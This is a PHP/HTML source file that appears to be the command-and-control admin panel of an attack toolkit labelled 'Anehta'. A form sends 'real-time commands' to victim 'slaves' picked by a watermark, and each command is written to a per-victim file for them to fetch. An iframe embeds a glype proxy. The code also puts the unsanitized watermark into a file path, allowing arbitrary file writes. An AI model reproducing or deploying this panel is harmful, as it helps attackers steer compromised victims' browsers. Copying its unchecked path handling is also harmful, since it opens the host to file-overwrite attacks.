<html><meta http-equiv=content-type content="text/html; charset=utf-8">
	<head>
	<script src="library/base.js" ></script>
	<script src="library/jQuery.js" ></script>
	<head>
	<body>
	<br>===================================================</br>
	<br>===================== Anehta ======================</br>
	<br>===================================================</br>

		<p></p>
		实时命令控制:
		<form id="realcmd" action="<?php $_SERVER['PHP_SELF']; ?>" method="post">
			<textarea id="cmd" name="cmd" cols=60 rows=20 ></textarea>
			<p>
				WaterMark: <input type=text id="slave" name="slave" value="" />
			  <input type=submit value="FVCK!" />
		  </p>
		</form>
		
	<br>
	  <p><!-- iframe width=800 height=700 src="slave/1224341218390/log.txt" ></iframe --></p>
	  <p><iframe width=800 height=700 src="tools/glype/index.php" ></iframe></p>
	</br>
		
		
	</body>
	
</html>

<?php
// 管理后台

if (!empty($_POST["cmd"])){
  $realtime_cmd = $_POST["cmd"];
  $slavewatermark = $_POST["slave"]; 
  
  $fp = fopen("slave\\$slavewatermark\\realtimecmd.txt", "w+");

  fwrite($fp, urldecode($realtime_cmd));

  fclose($fp);
}

?>

